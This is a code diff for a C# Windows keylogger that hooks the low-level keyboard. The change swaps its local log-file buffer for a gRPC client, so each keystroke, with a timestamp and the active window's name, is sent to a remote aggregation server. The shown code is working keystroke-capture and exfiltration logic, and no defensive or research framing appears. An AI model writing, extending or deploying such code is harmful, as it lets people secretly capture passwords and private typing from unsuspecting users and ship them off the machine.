@@ -1,11 +1,9 @@
 ﻿using System;
 using System.Diagnostics;
-using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Windows.Forms;
 using HookKeylogger.Base;
-using Google.Protobuf;
+using Grpc.Core;
 
 namespace Hooks
 {
@@ -16,13 +14,15 @@ namespace Hooks
         private HookProc callback = null;
         private static IntPtr _hookID = IntPtr.Zero;
         private static String log = "";
+        public static KerPressAggergator.KerPressAggergatorClient client;
 
         ///<summary>
         ///Initialize the keylogger.
         ///</summary>
-        public KeyLogger(String logloc)
+        public KeyLogger(KerPressAggergator.KerPressAggergatorClient c)
         {
-            log = logloc;
+            client = c;
+
             callback = new HookProc(HookCallback);
 
             using (Process curProcess = Process.GetCurrentProcess())
@@ -73,25 +73,30 @@ namespace Hooks
         ///</summary>
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
-            {
-                KeyPress ks = new KeyPress();
-                DateTimeOffset x = new DateTimeOffset(DateTime.Now);
-                ks.Key = Marshal.ReadInt32(lParam);
-                ks.Timestamp = x.ToUnixTimeMilliseconds();
-                ks.ActiveProgram = GetActiveWindowName();
-                
-                // Un-Comment these lines to write the KeyStrokes in the JSON human readable format. C# proto
-                // implementation lacks support for the Text encoding, the json encoding is the most human readable format.
-                //StreamWriter o = new StreamWriter(log+".json");
-                //o.WriteLine(ks.ToString());
-                //o.Close();
-                KeyPressBuffer b = new KeyPressBuffer(log);
-                b.AddKeyPress(ks);
+            if ((client != null) && (client.Channel.State != ChannelState.FatalFailure)){
+                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+                {
+                    KeyPress ks = new KeyPress();
+                    DateTimeOffset x = new DateTimeOffset(DateTime.Now);
+                    ks.Key = Marshal.ReadInt32(lParam);
+                    ks.Timestamp = x.ToUnixTimeMilliseconds();
+                    ks.ActiveProgram = GetActiveWindowName();
 
-                int vkCode = Marshal.ReadInt32(lParam);
-                Console.WriteLine((Keys)vkCode);
+                    // Un-Comment these lines to write the KeyStrokes in the JSON human readable format. C# proto
+                    // implementation lacks support for the Text encoding, the json encoding is the most human readable format.
+                    //StreamWriter o = new StreamWriter(log+".json");
+                    //o.WriteLine(ks.ToString());
+                    //o.Close();
+                    try {
+                        client.PutKeyPressAsync(ks);
+                    }
+                    catch (RpcException e)
+                    {
+                        Console.WriteLine("RPC Failed: " + e);
+                    }
+                }
             }
+
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
